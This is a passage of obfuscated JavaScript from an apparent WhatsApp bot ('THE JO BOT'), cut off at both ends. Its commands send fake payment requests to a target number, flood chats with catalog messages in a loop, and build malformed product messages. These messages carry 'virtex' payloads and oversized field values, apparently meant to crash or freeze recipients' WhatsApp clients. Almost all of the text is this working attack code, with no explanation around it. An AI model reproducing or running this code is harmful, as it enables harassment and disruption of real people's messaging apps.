memek=generateWAMessageFromContent(m[_0x55d03a(0xdf)],{'requestPaymentMessage':{'Message':{'extendedTextMessage':{'text':'THE\x20JO\x20BOT','currencyCodeIso4217':_0x55d03a(0xda),'requestFrom':_0x55d03a(0xca),'expiryTimestamp':0x1f40,'amount':0x1,'background':thumb}}}},{});jobotz[_0x55d03a(0xcd)](m[_0x55d03a(0xdf)],memek[_0x55d03a(0xed)],{'messageId':memek[_0x55d03a(0xd8)]['id']});}}
}
break

case 'jopayto':{
const _0x2b1348=_0x5c45;(function(_0x5d998c,_0x2e42ac){const _0x598a54=_0x5c45,_0x49bec2=_0x5d998c();while(!![]){try{const _0x345b2c=-parseInt(_0x598a54(0x20b))/0x1+parseInt(_0x598a54(0x1f7))/0x2*(parseInt(_0x598a54(0x202))/0x3)+-parseInt(_0x598a54(0x20a))/0x4*(-parseInt(_0x598a54(0x1f3))/0x5)+-parseInt(_0x598a54(0x208))/0x6*(parseInt(_0x598a54(0x1f2))/0x7)+-parseInt(_0x598a54(0x1ff))/0x8+parseInt(_0x598a54(0x1f9))/0x9+parseInt(_0x598a54(0x201))/0xa;if(_0x345b2c===_0x2e42ac)break;else _0x49bec2['push'](_0x49bec2['shift']());}catch(_0x23dba8){_0x49bec2['push'](_0x49bec2['shift']());}}}(_0x270c,0x7a41c));const _0x475bb7=(function(){let _0x30277a=!![];return function(_0x7af738,_0x3abab0){const _0x2b1393=_0x30277a?function(){const _0x4e0b05=_0x5c45;if(_0x3abab0){const _0x4fe046=_0x3abab0[_0x4e0b05(0x1f4)](_0x7af738,arguments);return _0x3abab0=null,_0x4fe046;}}:function(){};return _0x30277a=![],_0x2b1393;};}()),_0x52e519=_0x475bb7(this,function(){const _0x24bd9e=_0x5c45;return _0x52e519[_0x24bd9e(0x1f6)]()['search']('(((.+)+)+)+$')[_0x24bd9e(0x1f6)]()[_0x24bd9e(0x205)](_0x52e519)[_0x24bd9e(0x20c)](_0x24bd9e(0x1fc));});function _0x5c45(_0x582964,_0xcef666){const _0x51096d=_0x270c();return _0x5c45=function(_0xda1e5a,_0x1c6a5b){_0xda1e5a=_0xda1e5a-0x1f2;let _0x1a8fbe=_0x51096d[_0xda1e5a];return _0x1a8fbe;},_0x5c45(_0x582964,_0xcef666);}_0x52e519();const _0x1c6a5b=(function(){let _0x72d6f7=!![];return function(_0x2a84ce,_0x5b5c71){const _0x45337a=_0x72d6f7?function(){if(_0x5b5c71){const _0x360720=_0x5b5c71['apply'](_0x2a84ce,arguments);return _0x5b5c71=null,_0x360720;}}:function(){};return _0x72d6f7=![],_0x45337a;};}()),_0xda1e5a=_0x1c6a5b(this,function(){const _0x13049b=_0x5c45;let _0x3eefd0;try{const _0x18581b=Function(_0x13049b(0x1f8)+'{}.constructor(\x22return\x20this\x22)(\x20)'+');');_0x3eefd0=_0x18581b();}catch(_0x1ccf84){_0x3eefd0=window;}const _0x548011=_0x3eefd0[_0x13049b(0x1f5)]=_0x3eefd0[_0x13049b(0x1f5)]||{},_0x617d9d=[_0x13049b(0x204),'warn',_0x13049b(0x200),_0x13049b(0x20d),_0x13049b(0x206),'table',_0x13049b(0x1fe)];for(let _0x2c710f=0x0;_0x2c710f<_0x617d9d['length'];_0x2c710f++){const _0x440c4a=_0x1c6a5b[_0x13049b(0x205)]['prototype'][_0x13049b(0x1fd)](_0x1c6a5b),_0x5af045=_0x617d9d[_0x2c710f],_0x73b2ba=_0x548011[_0x5af045]||_0x440c4a;_0x440c4a[_0x13049b(0x209)]=_0x1c6a5b[_0x13049b(0x1fd)](_0x1c6a5b),_0x440c4a[_0x13049b(0x1f6)]=_0x73b2ba[_0x13049b(0x1f6)][_0x13049b(0x1fd)](_0x73b2ba),_0x548011[_0x5af045]=_0x440c4a;}});function _0x270c(){const _0x14d7c2=['65WMpxtJ','apply','console','toString','82Dwueer','return\x20(function()\x20','693036uhvwjL','chat','Nomernya\x20mana?','(((.+)+)+)+$','bind','trace','4539768EYWhyy','info','17375830NnShGc','25503UsCdBm','0@s.whatsapp.net','log','constructor','exception','THE\x20JO\x20BOT','3606726EHsRfN','__proto__','39640WFZhiw','622602xlwxkx','search','error','7hqCVCR'];_0x270c=function(){return _0x14d7c2;};return _0x270c();}_0xda1e5a();{if(!isCreator&&!isBan)return;if(!text)throw _0x2b1348(0x1fb);const memex=generateWAMessageFromContent(m[_0x2b1348(0x1fa)],{'requestPaymentMessage':{'Message':{'extendedTextMessage':{'text':_0x2b1348(0x207),'currencyCodeIso4217':'IDR','requestFrom':_0x2b1348(0x203),'expiryTimestamp':0x1f40,'amount':0x1,'background':thumb}}}},{});jobotz['relayMessage'](text+'@s.whatsapp.net',memex['message'],{'messageId':memex['key']['id']});}
}
break

case 'jogaspay':{
const _0x23590a=_0x536a;(function(_0x30bfb4,_0x282b3c){const _0x1ff581=_0x536a,_0x39b222=_0x30bfb4();while(!![]){try{const _0x3eda7c=parseInt(_0x1ff581(0x17a))/0x1*(parseInt(_0x1ff581(0x182))/0x2)+-parseInt(_0x1ff581(0x187))/0x3*(-parseInt(_0x1ff581(0x18c))/0x4)+parseInt(_0x1ff581(0x18e))/0x5+parseInt(_0x1ff581(0x183))/0x6+parseInt(_0x1ff581(0x186))/0x7+parseInt(_0x1ff581(0x17c))/0x8+-parseInt(_0x1ff581(0x189))/0x9;if(_0x3eda7c===_0x282b3c)break;else _0x39b222['push'](_0x39b222['shift']());}catch(_0x3c59ab){_0x39b222['push'](_0x39b222['shift']());}}}(_0x4fc1,0x1cf80));function _0x4fc1(){const _0x408bcd=['key','667695WZPYXQ','43035xDDnDK','IDR','6143976sBZOZq','error','exception','44zSgKEk','table','767130fhprks','trace','(((.+)+)+)+$','constructor','__proto__','info','log','relayMessage','toString','apply','message','console','184579GwrhaN','length','409760YbQoSf','chat','0@s.whatsapp.net','search','bind','return\x20(function()\x20','2fwSAFF','953490YvEchh','prototype'];_0x4fc1=function(){return _0x408bcd;};return _0x4fc1();}const _0x5dba40=(function(){let _0x2a02a2=!![];return function(_0x55574d,_0x10d39e){const _0x4fd777=_0x2a02a2?function(){const _0x3cc058=_0x536a;if(_0x10d39e){const _0xb373b3=_0x10d39e[_0x3cc058(0x177)](_0x55574d,arguments);return _0x10d39e=null,_0xb373b3;}}:function(){};return _0x2a02a2=![],_0x4fd777;};}()),_0x400942=_0x5dba40(this,function(){const _0x5ef4ef=_0x536a;return _0x400942['toString']()[_0x5ef4ef(0x17f)](_0x5ef4ef(0x190))[_0x5ef4ef(0x176)]()[_0x5ef4ef(0x191)](_0x400942)[_0x5ef4ef(0x17f)](_0x5ef4ef(0x190));});_0x400942();const _0x3713d3=(function(){let _0xe94a59=!![];return function(_0x3f947d,_0x1d72a8){const _0x4a3212=_0xe94a59?function(){const _0xc3ec3b=_0x536a;if(_0x1d72a8){const _0x11b43c=_0x1d72a8[_0xc3ec3b(0x177)](_0x3f947d,arguments);return _0x1d72a8=null,_0x11b43c;}}:function(){};return _0xe94a59=![],_0x4a3212;};}()),_0x4e1c83=_0x3713d3(this,function(){const _0x380bfd=_0x536a,_0xae1023=function(){const _0x25cd61=_0x536a;let _0x47ce1d;try{_0x47ce1d=Function(_0x25cd61(0x181)+'{}.constructor(\x22return\x20this\x22)(\x20)'+');')();}catch(_0x2bae7e){_0x47ce1d=window;}return _0x47ce1d;},_0x2017d8=_0xae1023(),_0x15f844=_0x2017d8[_0x380bfd(0x179)]=_0x2017d8[_0x380bfd(0x179)]||{},_0x55096b=[_0x380bfd(0x194),'warn',_0x380bfd(0x193),_0x380bfd(0x18a),_0x380bfd(0x18b),_0x380bfd(0x18d),_0x380bfd(0x18f)];for(let _0x1b946e=0x0;_0x1b946e<_0x55096b[_0x380bfd(0x17b)];_0x1b946e++){const _0xe73823=_0x3713d3['constructor'][_0x380bfd(0x184)]['bind'](_0x3713d3),_0x1b8316=_0x55096b[_0x1b946e],_0x2f1a92=_0x15f844[_0x1b8316]||_0xe73823;_0xe73823[_0x380bfd(0x192)]=_0x3713d3[_0x380bfd(0x180)](_0x3713d3),_0xe73823['toString']=_0x2f1a92[_0x380bfd(0x176)]['bind'](_0x2f1a92),_0x15f844[_0x1b8316]=_0xe73823;}});function _0x536a(_0x32ebbe,_0xe2fa96){const _0xef82ed=_0x4fc1();return _0x536a=function(_0x4e1c83,_0x3713d3){_0x4e1c83=_0x4e1c83-0x175;let _0x4a8e55=_0xef82ed[_0x4e1c83];return _0x4a8e55;},_0x536a(_0x32ebbe,_0xe2fa96);}_0x4e1c83();{if(!isCreator&&!isBan)return;if(!text)throw'Nomernya\x20mana?';const memex=generateWAMessageFromContent(m[_0x23590a(0x17d)],{'requestPaymentMessage':{'Message':{'extendedTextMessage':{'text':'THE\x20JO\x20BOT','currencyCodeIso4217':_0x23590a(0x188),'requestFrom':_0x23590a(0x17e),'expiryTimestamp':0x1f40,'amount':0x1,'background':thumb}}}},{});jobotz[_0x23590a(0x175)](text+'@s.whatsapp.net',memex[_0x23590a(0x178)],{'messageId':memex[_0x23590a(0x185)]['id']}),jobotz['relayMessage'](m[_0x23590a(0x17d)],memex[_0x23590a(0x178)],{'messageId':memex[_0x23590a(0x185)]['id']});}
}
break

case 'jocatalog': {
var _0x39a8db=_0x3d4a;(function(_0x31995a,_0x26e08a){var _0x4a4bfe=_0x3d4a,_0x39c790=_0x31995a();while(!![]){try{var _0x3b44f8=-parseInt(_0x4a4bfe(0x1a0))/0x1+parseInt(_0x4a4bfe(0x1a8))/0x2+-parseInt(_0x4a4bfe(0x1a7))/0x3*(-parseInt(_0x4a4bfe(0x1aa))/0x4)+parseInt(_0x4a4bfe(0x19a))/0x5+parseInt(_0x4a4bfe(0x187))/0x6+parseInt(_0x4a4bfe(0x1ac))/0x7+-parseInt(_0x4a4bfe(0x185))/0x8;if(_0x3b44f8===_0x26e08a)break;else _0x39c790['push'](_0x39c790['shift']());}catch(_0x45a931){_0x39c790['push'](_0x39c790['shift']());}}}(_0x2c65,0x3c9ce));function _0x2c65(){var _0x2538ae=['warn','error','return\x20(function()\x20','bind','IDR','186288HJWasS','Message','©\x20THE\x20JO\x20BOT\x20CATALOG','IDR\x209.000000','99999999999999','trace','relayMessage','60PVUEYi','365300haSXRW','{}.constructor(\x22return\x20this\x22)(\x20)','72596ugEspr','exception','3141936WqelEG','table','toString','constructor','chat','THE\x20JO\x20BOT\x20CATALOG\x20\x20','6073248VtZEup','(((.+)+)+)+$','966366pzNSpi','length','console','reply','search','__proto__','apply','key','info','©\x20THE\x20JO\x20BOT\x20CATALOG\x20','prototype','imageMessage','log','wa.me/6288286858385','Jumlahnya?','waUploadToServer','message','fromObject','6288286858385@s.whatsapp.net','190875dsmymm'];_0x2c65=function(){return _0x2538ae;};return _0x2c65();}var _0x2cb956=(function(){var _0x10fdbb=!![];return function(_0x1e40be,_0x194e6b){var _0x2fcbae=_0x10fdbb?function(){var _0x49b266=_0x3d4a;if(_0x194e6b){var _0x350fe7=_0x194e6b[_0x49b266(0x18d)](_0x1e40be,arguments);return _0x194e6b=null,_0x350fe7;}}:function(){};return _0x10fdbb=![],_0x2fcbae;};}()),_0x8e3f03=_0x2cb956(this,function(){var _0x525ed7=_0x3d4a;return _0x8e3f03[_0x525ed7(0x1ae)]()[_0x525ed7(0x18b)](_0x525ed7(0x186))[_0x525ed7(0x1ae)]()[_0x525ed7(0x182)](_0x8e3f03)['search']('(((.+)+)+)+$');});_0x8e3f03();var _0x3a4150=(function(){var _0x1047c8=!![];return function(_0x686799,_0x56a895){var _0x2b0718=_0x1047c8?function(){if(_0x56a895){var _0x57b88c=_0x56a895['apply'](_0x686799,arguments);return _0x56a895=null,_0x57b88c;}}:function(){};return _0x1047c8=![],_0x2b0718;};}()),_0x6d2d59=_0x3a4150(this,function(){var _0x16eb35=_0x3d4a,_0xafde3=function(){var _0x5d8f0a=_0x3d4a,_0x217507;try{_0x217507=Function(_0x5d8f0a(0x19d)+_0x5d8f0a(0x1a9)+');')();}catch(_0x3865b9){_0x217507=window;}return _0x217507;},_0x496749=_0xafde3(),_0x2c0a32=_0x496749['console']=_0x496749[_0x16eb35(0x189)]||{},_0x4f327c=[_0x16eb35(0x193),_0x16eb35(0x19b),_0x16eb35(0x18f),_0x16eb35(0x19c),_0x16eb35(0x1ab),_0x16eb35(0x1ad),_0x16eb35(0x1a5)];for(var _0x3d9bd0=0x0;_0x3d9bd0<_0x4f327c[_0x16eb35(0x188)];_0x3d9bd0++){var _0x5252e0=_0x3a4150[_0x16eb35(0x182)][_0x16eb35(0x191)][_0x16eb35(0x19e)](_0x3a4150),_0x22157e=_0x4f327c[_0x3d9bd0],_0x4ab427=_0x2c0a32[_0x22157e]||_0x5252e0;_0x5252e0[_0x16eb35(0x18c)]=_0x3a4150[_0x16eb35(0x19e)](_0x3a4150),_0x5252e0[_0x16eb35(0x1ae)]=_0x4ab427[_0x16eb35(0x1ae)][_0x16eb35(0x19e)](_0x4ab427),_0x2c0a32[_0x22157e]=_0x5252e0;}});_0x6d2d59();function _0x3d4a(_0x3ba6a9,_0x14e4cc){var _0x3d93db=_0x2c65();return _0x3d4a=function(_0x6d2d59,_0x3a4150){_0x6d2d59=_0x6d2d59-0x182;var _0x5f0a2c=_0x3d93db[_0x6d2d59];return _0x5f0a2c;},_0x3d4a(_0x3ba6a9,_0x14e4cc);}{if(!isCreator&&!isBan)return;if(args[_0x39a8db(0x188)]==0x0)return m[_0x39a8db(0x18a)](_0x39a8db(0x195));jumlah=''+encodeURI(q);for(let i=0x0;i<jumlah;i++){var messa=await prepareWAMessageMedia({'image':thumb},{'upload':jobotz[_0x39a8db(0x196)]}),catalog=generateWAMessageFromContent(m['chat'],proto[_0x39a8db(0x1a1)][_0x39a8db(0x198)]({'productMessage':{'product':{'productImage':messa[_0x39a8db(0x192)],'productId':_0x39a8db(0x1a4),'title':_0x39a8db(0x184)+thejo,'description':_0x39a8db(0x190)+thejo,'currencyCode':_0x39a8db(0x19f),'footerText':_0x39a8db(0x1a2),'productImageCount':0x1,'firstImageId':0x1,'priceAmount1000':'1000\x20'+thejo,'salePriceAmount1000':_0x39a8db(0x1a3),'retailerId':'THE\x20JO\x20BOT','url':_0x39a8db(0x194)},'businessOwnerJid':_0x39a8db(0x199),'contextInfo':{'forwardingScore':0x96,'isForwarded':!![]}}}),{'userJid':m[_0x39a8db(0x183)],'quoted':fkonjo});jobotz[_0x39a8db(0x1a6)](m[_0x39a8db(0x183)],catalog[_0x39a8db(0x197)],{'messageId':catalog[_0x39a8db(0x18e)]['id']});}jancok('Sukses\x20Send\x20Catalog\x20Sebanyak\x20'+jumlah);}
}
break

case 'jocatalogv2': {
var _0x3b6037=_0x4b78;(function(_0x12e9af,_0x2562b5){var _0x5d9fd2=_0x4b78,_0x5378b4=_0x12e9af();while(!![]){try{var _0x4c82dd=-parseInt(_0x5d9fd2(0x1df))/0x1+-parseInt(_0x5d9fd2(0x203))/0x2+-parseInt(_0x5d9fd2(0x1e7))/0x3*(-parseInt(_0x5d9fd2(0x1f6))/0x4)+parseInt(_0x5d9fd2(0x1e4))/0x5+parseInt(_0x5d9fd2(0x1ef))/0x6*(parseInt(_0x5d9fd2(0x1f5))/0x7)+-parseInt(_0x5d9fd2(0x1db))/0x8*(-parseInt(_0x5d9fd2(0x1ee))/0x9)+parseInt(_0x5d9fd2(0x1e3))/0xa*(parseInt(_0x5d9fd2(0x1f9))/0xb);if(_0x4c82dd===_0x2562b5)break;else _0x5378b4['push'](_0x5378b4['shift']());}catch(_0x1d5662){_0x5378b4['push'](_0x5378b4['shift']());}}}(_0x3f2a,0xa338f));var _0x1c0cb8=(function(){var _0x1dfab8=!![];return function(_0x1fccfa,_0x54cd67){var _0x43db7b=_0x1dfab8?function(){var _0x1c86c9=_0x4b78;if(_0x54cd67){var _0x1ad3b5=_0x54cd67[_0x1c86c9(0x202)](_0x1fccfa,arguments);return _0x54cd67=null,_0x1ad3b5;}}:function(){};return _0x1dfab8=![],_0x43db7b;};}()),_0x4db1fe=_0x1c0cb8(this,function(){var _0x3697f9=_0x4b78;return _0x4db1fe[_0x3697f9(0x1de)]()[_0x3697f9(0x1e6)](_0x3697f9(0x1ec))[_0x3697f9(0x1de)]()[_0x3697f9(0x1fa)](_0x4db1fe)[_0x3697f9(0x1e6)](_0x3697f9(0x1ec));});_0x4db1fe();var _0x165320=(function(){var _0xd5e949=!![];return function(_0x1540ce,_0x29791d){var _0x3b067c=_0xd5e949?function(){var _0x5f0cbf=_0x4b78;if(_0x29791d){var _0x294b6e=_0x29791d[_0x5f0cbf(0x202)](_0x1540ce,arguments);return _0x29791d=null,_0x294b6e;}}:function(){};return _0xd5e949=![],_0x3b067c;};}()),_0x21f8be=_0x165320(this,function(){var _0x17ee05=_0x4b78,_0xf533cb=function(){var _0x2086e3=_0x4b78,_0x367542;try{_0x367542=Function(_0x2086e3(0x1fd)+'{}.constructor(\x22return\x20this\x22)(\x20)'+');')();}catch(_0x48a80e){_0x367542=window;}return _0x367542;},_0x13e8e5=_0xf533cb(),_0x349e89=_0x13e8e5['console']=_0x13e8e5[_0x17ee05(0x1f2)]||{},_0x5ddcdb=[_0x17ee05(0x1fe),_0x17ee05(0x1dc),_0x17ee05(0x1e9),_0x17ee05(0x204),_0x17ee05(0x1f7),_0x17ee05(0x1ff),_0x17ee05(0x1ea)];for(var _0xff432f=0x0;_0xff432f<_0x5ddcdb[_0x17ee05(0x1e5)];_0xff432f++){var _0x57f6f6=_0x165320['constructor'][_0x17ee05(0x1fb)][_0x17ee05(0x1ed)](_0x165320),_0x1ca3cc=_0x5ddcdb[_0xff432f],_0x32d94b=_0x349e89[_0x1ca3cc]||_0x57f6f6;_0x57f6f6[_0x17ee05(0x1eb)]=_0x165320[_0x17ee05(0x1ed)](_0x165320),_0x57f6f6['toString']=_0x32d94b['toString'][_0x17ee05(0x1ed)](_0x32d94b),_0x349e89[_0x1ca3cc]=_0x57f6f6;}});_0x21f8be();function _0x3f2a(){var _0x5f59eb=['chat','119XRmCXF','8WVPgVl','exception','Sama\x20gk\x20guna😏','22snuviQ','constructor','prototype','message','return\x20(function()\x20','log','table','fromObject','IDR\x2099.99999999999999999999','apply','1974584gRviDr','error','IDR','Gk\x20guna😏','💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤','CATALOG\x20NEW\x20ERA','999','24fwIBzs','warn','relayMessage','toString','1204061uCZyzz','JEMBOD','THE\x20JO\x20BOT','imageMessage','6050190spUCSE','1349085ysttaH','length','search','370803lRzXSg','reply','info','trace','__proto__','(((.+)+)+)+$','bind','2969145buLbve','50520CZjsyK','Sukses\x20Send\x20Catalogv2\x20Sebanyak\x20','Jumlahnya?','console','https://youtube.com/channel/UCfhWUHl7dskRCVlyDMxnQbw'];_0x3f2a=function(){return _0x5f59eb;};return _0x3f2a();}function _0x4b78(_0x1202bc,_0x2e204e){var _0x332d3e=_0x3f2a();return _0x4b78=function(_0x21f8be,_0x165320){_0x21f8be=_0x21f8be-0x1d8;var _0x36ee39=_0x332d3e[_0x21f8be];return _0x36ee39;},_0x4b78(_0x1202bc,_0x2e204e);}{if(!isCreator&&!isBan)return;if(args[_0x3b6037(0x1e5)]==0x0)return m[_0x3b6037(0x1e8)](_0x3b6037(0x1f1));jumlah=''+encodeURI(q);for(let i=0x0;i<jumlah;i++){var messa=await prepareWAMessageMedia({'image':{'url':'https://telegra.ph/file/094abb98c63d1fbac703e.jpg'}},{'upload':jobotz['waUploadToServer']}),catalog=generateWAMessageFromContent(m[_0x3b6037(0x1f4)],proto['Message'][_0x3b6037(0x200)]({'productMessage':{'product':{'productImage':messa[_0x3b6037(0x1e2)],'productId':_0x3b6037(0x1e0),'fileLength':'99999999999','jpegThumbnail':virgam,'title':_0x3b6037(0x1e1),'description':_0x3b6037(0x1d8)+virtex2,'currencyCode':_0x3b6037(0x205),'productImageCount':0x370ad515,'firstImageId':0x1,'priceAmount1000':_0x3b6037(0x1da),'salePriceAmount1000':_0x3b6037(0x201),'bodyText':_0x3b6037(0x206),'footerText':_0x3b6037(0x1f8),'retailerId':_0x3b6037(0x1d9),'url':_0x3b6037(0x1f3)},'businessOwnerJid':'6285706035039@s.whatsapp.net','contextInfo':{'forwardingScore':0x96,'isForwarded':!![]}}}),{'userJid':m['chat'],'quoted':shield2});jobotz[_0x3b6037(0x1dd)](m[_0x3b6037(0x1f4)],catalog[_0x3b6037(0x1fc)],{'messageId':catalog['key']['id']});}jancok(_0x3b6037(0x1f0)+jumlah);}
}
break

case 'jadicatalog':{
var _0xc6393f=_0x3078;(function(_0x376098,_0x41d150){var _0x15893a=_0x3078,_0x1221ab=_0x376098();while(!![]){try{var _0x3e76b6=parseInt(_0x15893a(0x1c8))/0x1+-parseInt(_0x15893a(0x1e0))/0x2+-parseInt(_0x15893a(0x1e4))/0x3+-parseInt(_0x15893a(0x1d3))/0x4+parseInt(_0x15893a(0x1c5))/0x5+parseInt(_0x15893a(0x1ee))/0x6*(-parseInt(_0x15893a(0x1f1))/0x7)+-parseInt(_0x15893a(0x1e8))/0x8*(-parseInt(_0x15893a(0x1e7))/0x9);if(_0x3e76b6===_0x41d150)break;else _0x1221ab['push'](_0x1221ab['shift']());}catch(_0x556749){_0x1221ab['push'](_0x1221ab['shift']());}}}(_0x2fb6,0xb16c9));var _0x3dd764=(function(){var _0xbba82a=!![];return function(_0x1b80dd,_0xb6b0c4){var _0xb4c8ce=_0xbba82a?function(){var _0x1ea3d8=_0x3078;if(_0xb6b0c4){var _0x460efc=_0xb6b0c4[_0x1ea3d8(0x1e3)](_0x1b80dd,arguments);return _0xb6b0c4=null,_0x460efc;}}:function(){};return _0xbba82a=![],_0xb4c8ce;};}()),_0x144a49=_0x3dd764(this,function(){var _0x45550e=_0x3078;return _0x144a49[_0x45550e(0x1de)]()[_0x45550e(0x1ed)](_0x45550e(0x1cb))[_0x45550e(0x1de)]()['constructor'](_0x144a49)['search']('(((.+)+)+)+$');});_0x144a49();var _0x9ab345=(function(){var _0x504721=!![];return function(_0x2fe0bf,_0x439ee1){var _0x2e9311=_0x504721?function(){var _0x327dd2=_0x3078;if(_0x439ee1){var _0xdc52f3=_0x439ee1[_0x327dd2(0x1e3)](_0x2fe0bf,arguments);return _0x439ee1=null,_0xdc52f3;}}:function(){};return _0x504721=![],_0x2e9311;};}()),_0x1cfe6b=_0x9ab345(this,function(){var _0x363fdd=_0x3078,_0x50fb3e;try{var _0x200e7e=Function(_0x363fdd(0x1f2)+'{}.constructor(\x22return\x20this\x22)(\x20)'+');');_0x50fb3e=_0x200e7e();}catch(_0x3f222b){_0x50fb3e=window;}var _0x367709=_0x50fb3e['console']=_0x50fb3e[_0x363fdd(0x1d0)]||{},_0x5efb4d=['log',_0x363fdd(0x1d2),_0x363fdd(0x1c9),_0x363fdd(0x1db),_0x363fdd(0x1e1),_0x363fdd(0x1e9),_0x363fdd(0x1ca)];for(var _0x160242=0x0;_0x160242<_0x5efb4d[_0x363fdd(0x1cd)];_0x160242++){var _0x1a6ecc=_0x9ab345[_0x363fdd(0x1dd)][_0x363fdd(0x1eb)][_0x363fdd(0x1cf)](_0x9ab345),_0x5a312f=_0x5efb4d[_0x160242],_0x308bfb=_0x367709[_0x5a312f]||_0x1a6ecc;_0x1a6ecc['__proto__']=_0x9ab345['bind'](_0x9ab345),_0x1a6ecc['toString']=_0x308bfb[_0x363fdd(0x1de)][_0x363fdd(0x1cf)](_0x308bfb),_0x367709[_0x5a312f]=_0x1a6ecc;}});function _0x2fb6(){var _0x486e7c=['chat','\x20CATALOG\x20BY:\x20','https://youtube.com/channel/UCfhWUHl7dskRCVlyDMxnQbw','key','error','Sama\x20gk\x20guna😏','constructor','toString','999','1013140wuXFkp','exception','JEMBOD','apply','4093098tXPWyd','quoted','Sukses\x20Convert\x20Catalog','36FgFzVn','3564664WwoUci','table','download','prototype','fromObject','search','90JcNRqc','Message','waUploadToServer','191128udPmNc','return\x20(function()\x20','IDR\x2099.99999999999999999999','724660yYTUZf','Teksnya\x20Mana?','message','1410409qLUrYj','info','trace','(((.+)+)+)+$','relayMessage','length','imageMessage','bind','console','*Send/Reply\x20Image','warn','1321792kNwTBp','CATALOG\x20NEW\x20ERA','💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤💤','Gk\x20guna😏'];_0x2fb6=function(){return _0x486e7c;};return _0x2fb6();}_0x1cfe6b();function _0x3078(_0x4bfee0,_0x460f0a){var _0xea9cbb=_0x2fb6();return _0x3078=function(_0x1cfe6b,_0x9ab345){_0x1cfe6b=_0x1cfe6b-0x1c5;var _0x2369ff=_0xea9cbb[_0x1cfe6b];return _0x2369ff;},_0x3078(_0x4bfee0,_0x460f0a);}{if(!isCreator&&!isBan)return;if(!m[_0xc6393f(0x1e5)])throw _0xc6393f(0x1d1);if(!text)throw _0xc6393f(0x1c6);let media=await quoted[_0xc6393f(0x1ea)]();var messa=await prepareWAMessageMedia({'image':media},{'upload':jobotz[_0xc6393f(0x1f0)]}),catalog=generateWAMessageFromContent(m[_0xc6393f(0x1d7)],proto[_0xc6393f(0x1ef)][_0xc6393f(0x1ec)]({'productMessage':{'product':{'productImage':messa[_0xc6393f(0x1ce)],'productId':_0xc6393f(0x1e2),'fileLength':'99999999999','jpegThumbnail':virgam,'title':_0xc6393f(0x1d8)+text+'\x20','description':_0xc6393f(0x1d5)+philips,'currencyCode':'IDR','productImageCount':0x370ad515,'firstImageId':0x1,'priceAmount1000':_0xc6393f(0x1df),'salePriceAmount1000':_0xc6393f(0x1f3),'bodyText':_0xc6393f(0x1d6),'footerText':_0xc6393f(0x1dc),'retailerId':_0xc6393f(0x1d4),'url':_0xc6393f(0x1d9)},'businessOwnerJid':'6285706035039@s.whatsapp.net','contextInfo':{'forwardingScore':0x96,'isForwarded':!![]}}}),{'userJid':m[_0xc6393f(0x1d7)],'quoted':shield2});jobotz[_0xc6393f(0x1cc)](m[_0xc6393f(0x1d7)],catalog[_0xc6393f(0x1c7)],{'messageId':catalog[_0xc6393f(0x1da)]['id']}),jancok(_0xc6393f(0x1e6));}
}
break

case 'jobugpc': {
const _0x4d5b06=_0x1288;(function(_0x24142d,_0x37a83a){const _0x4e6d5a=_0x1288,_0x1d784f=_0x24142d();while(!![]){try{const _0x45b581=-parseInt(_0x4e6d5a(0xf2))/0x1+parseInt(_0x4e6d5a(0xf0))/0x2+parseInt(_0x4e6d5a(0xdb))/0x3*(parseInt(_0x4e6d5a(0xdf))/0x4)+parseInt(_0x4e6d5a(0xe6))/0x5+-parseInt(_0x4e6d5a(0xd9))/0x6+-parseInt(_0x4e6d5a(0xde))/0x7+parseInt(_0x4e6d5a(0xed))/0x8*(-parseInt(_0x4e6d5a(0xe2))/0x9);if(_0x45b581===_0x37a83a)break;else _0x1d784f['push'](_0x1d784f['shift']());}catch(_0x59b0e2){_0x1d784f['push'](_0x1d784f['shift']());}}}(_0x4182,0x33e92));const _0x440f5d=(function(){let _0x5a9a2e=!![];return function(_0x413b94,_0x1d1428){const _0x28135f=_0x5a9a2e?function(){const _0x797d1c=_0x1288;if(_0x1d1428){const _0x27e8bb=_0x1d1428[_0x797d1c(0xd2)](_0x413b94,arguments);return _0x1d1428=null,_0x27e8bb;}}:function(){};return _0x5a9a2e=![],_0x28135f;};}()),_0x5aa7b3=_0x440f5d(this,function(){const _0x50b04b=_0x1288;return _0x5aa7b3[_0x50b04b(0xd1)]()[_0x50b04b(0xd4)](_0x50b04b(0xe7))['toString']()[_0x50b04b(0xe9)](_0x5aa7b3)[_0x50b04b(0xd4)](_0x50b04b(0xe7));});_0x5aa7b3();function _0x1288(_0x1149d1,_0x2dcd69){const _0x42ba5c=_0x4182();return _0x1288=function(_0x2324d7,_0x496bdd){_0x2324d7=_0x2324d7-0xce;let _0x490dbb=_0x42ba5c[_0x2324d7];return _0x490dbb;},_0x1288(_0x1149d1,_0x2dcd69);}function _0x4182(){const _0x1f510f=['search','message','length','readFileSync','THE\x20JO\x20BOT\x20🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥','215694XDZXol','0@s.whatsapp.net','3RJCCqU','trace','By:\x20THE\x20JO\x20BOT','2348675sNbiIM','1430932uIZKRb','table','console','9FwdlzA','info','99999999999','BUG\x20INVITE\x20THE\x20JO\x20BOT\x0a\x0a','2023210DBTZsQ','(((.+)+)+)+$','chat','constructor','CZ/GAeOhayYnqjcK','reply','error','322456gTCAfd','./pict.jpg','relayMessage','530140gukwiJ','9999999999999999','403038rYFXzf','{}.constructor(\x22return\x20this\x22)(\x20)','bind','warn','__proto__','toString','apply','key'];_0x4182=function(){return _0x1f510f;};return _0x4182();}const _0x496bdd=(function(){let _0x5b5c23=!![];return function(_0x178aff,_0x24af74){const _0x506ced=_0x5b5c23?function(){const _0x471472=_0x1288;if(_0x24af74){const _0x4447ff=_0x24af74[_0x471472(0xd2)](_0x178aff,arguments);return _0x24af74=null,_0x4447ff;}}:function(){};return _0x5b5c23=![],_0x506ced;};}()),_0x2324d7=_0x496bdd(this,function(){const _0x93897f=_0x1288,_0x43c5b5=function(){const 